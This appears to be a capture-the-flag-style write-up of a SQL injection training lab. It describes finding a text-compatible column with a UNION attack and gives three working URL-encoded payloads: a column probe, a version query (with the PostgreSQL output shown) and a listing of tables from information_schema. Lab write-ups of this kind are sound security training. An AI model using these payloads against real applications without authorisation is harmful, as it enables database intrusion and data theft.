# Lab: SQL injection UNION attack, finding a column containing text

## Lab Information

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 


## Steps to Reproduce
### Finding String Compatible Column

- Now we need to find which column is string type compatible.
- For that use the same HTTP intercepted request in repeater.

```sql
'+UNION+SELECT+NULL,'a',+NULL--
```

- The above payload works and we understand that column 2 is string type compatible.

### Finding Database Version

- Using the below payload we find out the database used. The database its `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`

```sql
'+UNION+SELECT+NULL,+version(),+NULL--
```

### Finding Tables

- Using the below payload we can look for tables in the database.

```sql
'+UNION+SELECT+NULL,+table_name,+NULL+FROM+information_schema.tables
```

